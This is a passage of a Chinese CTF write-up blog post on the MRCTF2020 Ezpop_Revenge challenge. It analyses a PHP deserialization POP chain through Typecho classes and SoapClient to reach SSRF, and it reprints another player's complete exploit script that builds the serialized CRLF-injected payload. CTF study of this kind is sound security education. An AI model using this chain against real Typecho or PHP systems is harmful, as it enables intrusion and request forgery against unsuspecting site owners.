+<p>可以看到，<code>HelloWorld_DB</code>中的<code>__wakeup</code>实例化了一个<code>Typecho_Db</code>，一会可以跟进一下；下面这个类在没有设置session时会开启session，接受到<code>admin</code>参数时会输出session，并过滤了<code>C0incid3nc3</code>参数的一些RCE及特殊字符，过滤成功则反序列化<code>C0incid3nc3</code>，也需要跟进一下<code>action</code>函数<br>先跟进一下<code>Typecho_Db</code>，在var\Typecho\Db.php，此脚本核心代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Db</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$adapterName, $prefix = <span class="string">&#x27;typecho_&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">/** 获取适配器名称 */</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_adapterName = $adapterName;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** 数据库适配器 */</span></span><br><span class="line">        $adapterName = <span class="string">&#x27;Typecho_Db_Adapter_&#x27;</span> . $adapterName;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!call_user_func(<span class="keyword">array</span>($adapterName, <span class="string">&#x27;isAvailable&#x27;</span>))) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> Typecho_Db_Exception(<span class="string">&quot;Adapter <span class="subst">&#123;$adapterName&#125;</span> is not available&quot;</span>);<span class="comment">//__toString()</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_prefix = $prefix;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** 初始化内部变量 */</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_pool = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_connectedPool = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_config = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//实例化适配器对象</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_adapter = <span class="keyword">new</span> $adapterName();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>第九行，字符串拼接<code>__wakeup</code>实例化的<code>coincidence[&#39;hello&#39;]</code>，类被当成字符串拼接，那就会调用某个类的<code>__toString</code>，且<code>$adapterName</code>可控，再搜，找到<code>var\Typecho\Db\Query.php</code>中定义了一大段，核心如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Db_Query</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> $_default = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;action&#x27;</span> =&gt; <span class="literal">NULL</span>,</span><br><span class="line">        <span class="string">&#x27;table&#x27;</span>  =&gt; <span class="literal">NULL</span>,</span><br><span class="line">        <span class="string">&#x27;fields&#x27;</span> =&gt; <span class="string">&#x27;*&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;join&#x27;</span>   =&gt; <span class="keyword">array</span>(),</span><br><span class="line">        <span class="string">&#x27;where&#x27;</span>  =&gt; <span class="literal">NULL</span>,</span><br><span class="line">        <span class="string">&#x27;limit&#x27;</span>  =&gt; <span class="literal">NULL</span>,</span><br><span class="line">        <span class="string">&#x27;offset&#x27;</span> =&gt; <span class="literal">NULL</span>,</span><br><span class="line">        <span class="string">&#x27;order&#x27;</span>  =&gt; <span class="literal">NULL</span>,</span><br><span class="line">        <span class="string">&#x27;group&#x27;</span>  =&gt; <span class="literal">NULL</span>,</span><br><span class="line">        <span class="string">&#x27;having&#x27;</span>  =&gt; <span class="literal">NULL</span>,</span><br><span class="line">        <span class="string">&#x27;rows&#x27;</span>   =&gt; <span class="keyword">array</span>(),</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">private</span> $_sqlPreBuild;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> (<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;action&#x27;</span>]) &#123;</span><br><span class="line">            <span class="keyword">case</span> Typecho_Db::SELECT:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_adapter-&gt;parseSelect(<span class="keyword">$this</span>-&gt;_sqlPreBuild);</span><br><span class="line">            <span class="keyword">case</span> Typecho_Db::INSERT:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;INSERT INTO &#x27;</span></span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;table&#x27;</span>]</span><br><span class="line">                . <span class="string">&#x27;(&#x27;</span> . implode(<span class="string">&#x27; , &#x27;</span>, array_keys(<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;rows&#x27;</span>])) . <span class="string">&#x27;)&#x27;</span></span><br><span class="line">                . <span class="string">&#x27; VALUES &#x27;</span></span><br><span class="line">                . <span class="string">&#x27;(&#x27;</span> . implode(<span class="string">&#x27; , &#x27;</span>, array_values(<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;rows&#x27;</span>])) . <span class="string">&#x27;)&#x27;</span></span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;limit&#x27;</span>];</span><br><span class="line">            <span class="keyword">case</span> Typecho_Db::DELETE:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;DELETE FROM &#x27;</span></span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;table&#x27;</span>]</span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;where&#x27;</span>];</span><br><span class="line">            <span class="keyword">case</span> Typecho_Db::UPDATE:</span><br><span class="line">                $columns = <span class="keyword">array</span>();</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;rows&#x27;</span>])) &#123;</span><br><span class="line">                    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;rows&#x27;</span>] <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">                        $columns[] = <span class="string">&quot;<span class="subst">$key</span> = <span class="subst">$val</span>&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;UPDATE &#x27;</span></span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;table&#x27;</span>]</span><br><span class="line">                . <span class="string">&#x27; SET &#x27;</span> . implode(<span class="string">&#x27; , &#x27;</span>, $columns)</span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;where&#x27;</span>];</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>通过反序列化控制<code>$this-&gt;_sqlPreBuild[&#39;action&#39;]</code>为<code>SELECT</code>，师傅WP里说如果$_sqlPreBuild[‘action’]为’SELECT’就会触发$_adapter的parseSelect()方法；这个地方一直搞不懂，<a target="_blank" rel="noopener" href="https://reader-l.github.io/2020/09/14/SoapClinet%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96SSRF%E5%AD%A6%E4%B9%A0/">这篇博客</a>给了不错的解释，<code>\$this-&gt;_adapter</code>也是可控的，只需要将其设置为<code>sopa</code>类即可<br>POP链分析：\</p>
+<ul>
+<li><p><code>HelloWorld_DB</code>类反序列化触发<code>__wakeup</code>魔术方法，<code>__wakeup</code>实例化<code>Typecho_Db</code>，并将<code>coincidence[&#39;hello&#39;]</code>作为此类构造函数的第一个参数</p>
+</li>
+<li><p>因PHP数组可以存储对象，如果<code>coincidence[&#39;hello&#39;]</code>实例化了<code>Typecho_Db</code>，而在构造函数中将其当成字符串那就会触发<code>__toString</code>魔术方法</p>
+</li>
+<li><p>在<code>__toString</code>方法中，如果<code>$this-&gt;_sqlPreBuild[&#39;action&#39;]</code>为<code>SELECT</code>就会触发<code>$this-&gt;_adapter-&gt;parseSelect($this-&gt;_sqlPreBuild)</code>，并控制私有变量<code>$_adapter</code>为<code>soap</code>类来本地访问<code>flag.php</code></p>
+</li>
+<li><p>假如<code>$this-&gt;_adapter</code>实例化一个<code>SoapClient</code>类，再去调用一个不存在的<code>parseSelect</code>方法，就会触发<code>__call</code>魔术方法</p>
+</li>
+<li><p><code>__call</code>方法可以帮助我们SSRF</p>
+</li>
+</ul>
+<p>PHP 的 SOAP 扩展可以用来提供和使用 Web Services，该类的构造函数如下：<br><code>public SoapClient::__call ( string $function_name , array $arguments )</code></p>
+<blockquote>
+<p>第一个参数是用来指明是否是wsdl模式<br>第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间<br><img src="https://raw.githubusercontent.com/yq1ng/blog/master/MRCTF2020/image.bbtbn5jwmaa.png" alt="wsdl"></p>
+</blockquote>
+<p>本题类的private在反序列化时会变成不可见字符，此时需要将不可见的<code>%00</code>写成十六进制<code>\00</code>，贴上Y1ng师傅的exp：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//www.gem-love.com</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Db_Query</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_adapter;</span><br><span class="line">    <span class="keyword">private</span> $_sqlPreBuild;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $target = <span class="string">&quot;http://127.0.0.1/flag.php&quot;</span>;</span><br><span class="line">        $headers = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;X-Forwarded-For:127.0.0.1&#x27;</span>,</span><br><span class="line">            <span class="string">&quot;Cookie: PHPSESSID=v456n8hvl1h5s7b7ihjnb03163&quot;</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_adapter = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>, <span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&#x27;aaab&#x27;</span>, <span class="string">&#x27;location&#x27;</span> =&gt; $target, <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="string">&#x27;Y1ng^^&#x27;</span> . join(<span class="string">&#x27;^^&#x27;</span>, $headers)));</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_sqlPreBuild = [<span class="string">&#x27;action&#x27;</span> =&gt; <span class="string">&quot;SELECT&quot;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld_DB</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $coincidence;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;coincidence = <span class="keyword">array</span>(<span class="string">&quot;hello&quot;</span> =&gt; <span class="keyword">new</span> Typecho_Db_Query());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decorate</span>(<span class="params">$str</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $arr = explode(<span class="string">&#x27;:&#x27;</span>, $str);</span><br><span class="line">    $newstr = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; count($arr); $i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/00/&#x27;</span>, $arr[$i])) &#123;</span><br><span class="line">            $arr[$i - <span class="number">2</span>] = preg_replace(<span class="string">&#x27;/s/&#x27;</span>, <span class="string">&quot;S&quot;</span>, $arr[$i - <span class="number">2</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (; $i &lt; count($arr) - <span class="number">1</span>; $i++) &#123;</span><br><span class="line">        $newstr .= $arr[$i];</span><br><span class="line">        $newstr .= <span class="string">&quot;:&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $newstr .= $arr[$i];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;www.gem-love.com\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> $newstr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$y1ng = serialize(<span class="keyword">new</span> HelloWorld_DB());</span><br><span class="line">$y1ng = preg_replace(<span class="string">&quot; /\^\^/&quot;</span>, <span class="string">&quot;\r\n&quot;</span>, $y1ng);</span><br><span class="line">$urlen = urlencode($y1ng);</span><br><span class="line">$urlen = preg_replace(<span class="string">&#x27;/%00/&#x27;</span>, <span class="string">&#x27;%5c%30%30&#x27;</span>, $urlen);</span><br><span class="line">$y1ng = decorate(urldecode($urlen));</span><br><span class="line"><span class="keyword">echo</span> base64_encode($y1ng);</span><br></pre></td></tr></table></figure>
+<p>不行了，不行了，肝了几天都看不懂，菜鸡暂时放弃，我会回来征服它的！</p>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div></div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.png" alt="yq1ng 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/alipay.jpg" alt="yq1ng 支付宝">
+        <p>支付宝</p>
+      </div>
+
+  </div>
+</div>
+
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>yq1ng
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://yq1ng.github.io/z_post/MRCTF2020-%E5%A5%97%E9%A4%90/" title="[MRCTF2020]套餐">http://yq1ng.github.io/z_post/MRCTF2020-套餐/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/z_post/%E5%B0%8F%E4%BC%A4%E6%84%9F/" rel="prev" title="小伤感">
+      <i class="fa fa-chevron-left"></i> 小伤感
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#MRCTF2020-%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2"><span class="nav-number">1.</span> <span class="nav-text">[MRCTF2020]你传你🐎呢</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MRCTF2020-Ez-bypass"><span class="nav-number">2.</span> <span class="nav-text">[MRCTF2020]Ez_bypass</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MRCTF2020-PYWebsite"><span class="nav-number">3.</span> <span class="nav-text">[MRCTF2020]PYWebsite</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MRCTF2020-Ezpop"><span class="nav-number">4.</span> <span class="nav-text">[MRCTF2020]Ezpop</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MRCTF2020-%E5%A5%97%E5%A8%83"><span class="nav-number">5.</span> <span class="nav-text">[MRCTF2020]套娃</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E5%85%B3"><span class="nav-number">5.1.</span> <span class="nav-text">第一关</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E5%85%B3"><span class="nav-number">5.2.</span> <span class="nav-text">第二关</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MRCTF2020-Ezaudit"><span class="nav-number">6.</span> <span class="nav-text">[MRCTF2020]Ezaudit</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MRCTF2020-Ezpop-Revenge"><span class="nav-number">7.</span> <span class="nav-text">MRCTF2020]Ezpop_Revenge</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="yq1ng"
+      src="/images/xiaoxin.jpg">
+  <p class="site-author-name" itemprop="name">yq1ng</p>
+  <div class="site-description" itemprop="description">The best way to know your strength is to fight</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">36</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/yq1ng" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;yq1ng" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://blog.csdn.net/weixin_43578492" title="CSDN → https:&#x2F;&#x2F;blog.csdn.net&#x2F;weixin_43578492" rel="noopener" target="_blank"><i class="heartbeat fa-fw"></i>CSDN</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:1578422748@qq.com" title="E-Mail → mailto:1578422748@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="http://wpa.qq.com/msgrd?v=3&uin=%271578422748++%27&site=qq&menu=yes" title="QQ → http:&#x2F;&#x2F;wpa.qq.com&#x2F;msgrd?v&#x3D;3&amp;uin&#x3D;&#39;1578422748++&#39;&amp;site&#x3D;qq&amp;menu&#x3D;yes" rel="noopener" target="_blank"><i class="qq fa-fw"></i>QQ</a>
+      </span>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        <script
+  async
+  src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"
+></script>
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">yq1ng</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">87k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">2:25</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+<br />
+<!-- 网站运行时间的设置 -->
+<span id="timeDate">载入天数...</span>
+<span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("09/27/2020 00:00:00");//此处修改你的建站时间或者网站上线时间
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  <!-- 页面点击小红心 -->
+  <script type="text/javascript" src="/js/src/clicklove.js"></script>
+</body>
+</html>
